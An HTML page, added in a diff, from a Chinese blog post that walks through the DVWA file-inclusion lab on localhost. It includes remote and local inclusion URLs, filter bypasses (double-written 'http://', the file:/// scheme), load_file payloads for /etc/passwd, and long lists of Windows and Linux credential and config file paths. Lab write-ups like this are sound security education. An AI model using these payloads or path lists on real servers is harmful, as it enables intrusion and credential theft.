@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="File Inclusion介绍当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用网址去打开调取包含文件，文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许">
+<meta property="og:type" content="website">
+<meta property="og:title" content="inclusion">
+<meta property="og:url" content="http://example.com/dvwa-inclusion/inclusion.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="File Inclusion介绍当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用网址去打开调取包含文件，文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/dvwa-inclusion/inclusion/1.png">
+<meta property="og:image" content="http://example.com/dvwa-inclusion/inclusion/2.png">
+<meta property="og:image" content="http://example.com/dvwa-inclusion/inclusion/3.png">
+<meta property="og:image" content="http://example.com/dvwa-inclusion/inclusion/4.png">
+<meta property="og:image" content="http://example.com/dvwa-inclusion/inclusion/5.png">
+<meta property="og:image" content="http://example.com/dvwa-inclusion/inclusion/6.png">
+<meta property="og:image" content="http://example.com/dvwa-inclusion/inclusion/7.png">
+<meta property="og:image" content="http://example.com/dvwa-inclusion/inclusion/8.png">
+<meta property="og:image" content="http://example.com/dvwa-inclusion/inclusion/9.png">
+<meta property="article:published_time" content="2021-01-27T06:46:14.000Z">
+<meta property="article:modified_time" content="2021-01-27T08:56:52.277Z">
+<meta property="article:author" content="ziyuexi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/dvwa-inclusion/inclusion/1.png">
+
+<link rel="canonical" href="http://example.com/dvwa-inclusion/inclusion">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>inclusion | blog
+</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+  
+  
+
+          <div class="content page posts-expand">
+            
+
+    
+    
+    
+    <div class="post-block" lang="zh-CN">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">inclusion
+</h1>
+
+<div class="post-meta">
+  
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+          <h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用网址去打开调取包含文件，文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
+<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><p><img src="/dvwa-inclusion/inclusion/1.png" alt="A1"><br>我们现在来做low难度的题，首先我们已经把allow_url_fopen和allow_url_include选项设置为ON，我们点击file 1可以看到头顶的url发生变化，page后面得到了file1.php那么我们可以写一个php的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> phpinfo(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后把它放到服务器中（当然如果在真实攻击下我们会有两个服务器，一个是我们要攻击的目标服务器，还有一个是我们自己的服务器，我们将写好的恶意代码放到自己的服务器中）<br><img src="/dvwa-inclusion/inclusion/2.png" alt="A1"><br>然后我们编辑下url</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure>
+<p>我们修改了page后面的内容让这个网页打开我们另一个url的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure>
+<p>这另一个url文件前面的ip地址在正常攻击时会使用我们服务器的地址<br><img src="/dvwa-inclusion/inclusion/3.png" alt="A1"><br>我们现在得到了目标服务器上所有php的信息我们可以得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\phpStudy\php\php-5.4.45\php.ini </span><br></pre></td></tr></table></figure>
+<p>这样的有关服务器的信息<br>可以获得服务器的地址然后输入本地绝对路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;d:\phpstudy\mysql\my.ini</span><br></pre></td></tr></table></figure>
+<p>比如这样<br><img src="/dvwa-inclusion/inclusion/4.png" alt="A1"><br>我们可以得到服务器mysql的信息<br>我们可以去网上搜索一些win和linux的敏感地址在有文件包含漏洞时我们可以使用<br><strong>WINDOWS</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">c:&#x2F;boot.ini &#x2F;&#x2F;查看系统版本</span><br><span class="line"></span><br><span class="line">c:&#x2F;windows&#x2F;php.ini &#x2F;&#x2F;php配置信息</span><br><span class="line"></span><br><span class="line">c:&#x2F;windows&#x2F;my.ini &#x2F;&#x2F;MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</span><br><span class="line"></span><br><span class="line">c:&#x2F;winnt&#x2F;php.ini</span><br><span class="line"></span><br><span class="line">c:&#x2F;winnt&#x2F;my.ini</span><br><span class="line"></span><br><span class="line">c:\mysql\data\mysql\user.MYD &#x2F;&#x2F;存储了mysql.user表中的数据库连接密码</span><br><span class="line"></span><br><span class="line">c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini &#x2F;&#x2F;存储了虚拟主机网站路径和密码</span><br><span class="line"></span><br><span class="line">c:\Program Files\Serv-U\ServUDaemon.ini</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</span><br><span class="line"></span><br><span class="line">c:\windows\repair\sam &#x2F;&#x2F;存储了WINDOWS系统初次安装的密码</span><br><span class="line"></span><br><span class="line">c:\Program Files\ Serv-U\ServUAdmin.exe &#x2F;&#x2F;6.0版本以前的serv-u管理员密码存储于此</span><br><span class="line"></span><br><span class="line">c:\Program Files\RhinoSoft.com\ServUDaemon.exe</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;存储了pcAnywhere的登陆密码</span><br><span class="line"></span><br><span class="line">c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf &#x2F;&#x2F;查看WINDOWS系统apache文件</span><br><span class="line"></span><br><span class="line">c:&#x2F;Resin-3.0.14&#x2F;conf&#x2F;resin.conf &#x2F;&#x2F;查看jsp开发的网站 resin文件配置信息.</span><br><span class="line"></span><br><span class="line">c:&#x2F;Resin&#x2F;conf&#x2F;resin.conf &#x2F;usr&#x2F;local&#x2F;resin&#x2F;conf&#x2F;resin.conf 查看linux系统配置的JSP虚拟主机</span><br><span class="line"></span><br><span class="line">d:\APACHE\Apache2\conf\httpd.conf</span><br><span class="line"></span><br><span class="line">C:\Program Files\mysql\my.ini</span><br><span class="line"></span><br><span class="line">C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</span><br></pre></td></tr></table></figure>
+<p><strong>LUNIX</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;apache2缺省配置文件</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf &#x2F;&#x2F;虚拟网站设置</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关设置</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;sysconfig&#x2F;iptables &#x2F;&#x2F;从中得到防火墙规则策略</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; apache配置文件</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;rsyncd.conf &#x2F;&#x2F;同步程序配置文件</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;my.cnf &#x2F;&#x2F;mysql的配置文件</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;redhat-release &#x2F;&#x2F;系统版本</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;issue</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;issue.net</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关设置</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf &#x2F;&#x2F;虚拟网站设置</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf或&#x2F;usr&#x2F;local&#x2F;apche&#x2F;conf&#x2F;httpd.conf 查看linux APACHE虚拟主机配置文件</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;resin-3.0.22&#x2F;conf&#x2F;resin.conf 针对3.0.22的RESIN配置文件查看</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;resin-pro-3.0.22&#x2F;conf&#x2F;resin.conf 同上</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf APASHE虚拟主机查看</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf或&#x2F;usr&#x2F;local&#x2F;apche&#x2F;conf &#x2F;httpd.conf 查看linux APACHE虚拟主机配置文件</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;resin-3.0.22&#x2F;conf&#x2F;resin.conf 针对3.0.22的RESIN配置文件查看</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;resin-pro-3.0.22&#x2F;conf&#x2F;resin.conf 同上</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf APASHE虚拟主机查看</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;sysconfig&#x2F;iptables 查看防火墙策略</span><br><span class="line"></span><br><span class="line">load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录</span><br><span class="line"></span><br><span class="line">replace(load_file(0×2F6574632F706173737764),0×3c,0×20)</span><br><span class="line"></span><br><span class="line">replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</span><br></pre></td></tr></table></figure>
+<p>比如说我们想知道这个服务器的MYSQL的管理密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\mysql\data\mysql\user.MYD</span><br></pre></td></tr></table></figure>
+<p>可以使用这个<br><img src="/dvwa-inclusion/inclusion/5.png" alt="A1"><br>但是根本不对啊，因为我们并没有把服务器装到C盘上，而电脑也不是专门来做服务器用的，我们在建立服务器时用了PHPstudy我们可以修改刚才发现的php.ini的地址来进行修改</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\phpStudy\php\php-5.4.45\php.ini </span><br></pre></td></tr></table></figure>
+<p>修改为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\phpStudy\mysql\data\mysql\user.MYD</span><br></pre></td></tr></table></figure>
+<p>我们再试一试<br><img src="/dvwa-inclusion/inclusion/6.png" alt="A1"><br>可以看见我们的密码和账户</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>LOW级别的难度仅仅是调取page并不去过滤本地地址和远程地址</p>
+<hr>
+
+<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>我们先看一边源码<br>可以发现这次服务器在远程上过滤了http://和https://，在本地上过滤了../“, “..\，但幸运的是<br>str_replace（）函数会把http这样的字符删除我们可以通过双写来绕过这层过滤比如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;hhttp:&#x2F;&#x2F;ttp:&#x2F;&#x2F;127.0.0.1&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure>
+<p><img src="/dvwa-inclusion/inclusion/7.png" alt="A1"><br>服务器发现了http://将其删除后我们依然会组成http://来进行远程文件包含。而在使用相对地址时我们依然也可以使用…/./这样来绕过防护，而绝对地址对我们并没有什么影响，我们依然可以依靠绝对地址来获取我们想要的信息。</p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>服务器这次做了一些过滤但是使用的str_replace（）不够安全，可以建立一个for循环一直删除http://这样的字符</p>
+<hr>
+
+<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>我们依旧先来看代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>这次使用了fnmatch（）函数，要求我们必须以file开头才行<br><img src="/dvwa-inclusion/inclusion/8.png" alt="A1"><br>幸运的是我们可以利用file协议来进行本地上的绕过，就是说我们仅仅在本地的相对或者绝对连接上加入file:///就行比如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;D:\phpStudy\mysql\data\mysql\user.MYD</span><br></pre></td></tr></table></figure>
+<p><img src="/dvwa-inclusion/inclusion/9.png" alt="A1"><br>我们依然可以看到mysql的密码</p>
+<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>虽然相较于medium进行了升级，但是依旧留下了协议漏洞，其实可以对我们要打开的file1等文件改名并修改fnmatch的值来修复这一漏洞</p>
+<hr>
+
+<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p>我们直接来看代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>就是说我们必须打开这四个文件(include.php、file1.php、file2.php、file3.php)中的一个才行,这在根本上封杀掉文件包含的可能。</p>
+
+      </div>
+      
+      
+      
+    </div>
+    
+
+    
+    
+    
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#File-Inclusion"><span class="nav-number">1.</span> <span class="nav-text">File Inclusion</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LOW"><span class="nav-number">1.2.</span> <span class="nav-text">LOW</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.2.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#medium"><span class="nav-number">1.3.</span> <span class="nav-text">medium</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#high"><span class="nav-number">1.4.</span> <span class="nav-text">high</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-2"><span class="nav-number">1.4.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#impossible"><span class="nav-number">1.5.</span> <span class="nav-text">impossible</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ziyuexi</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ziyuexi</span>
+</div>
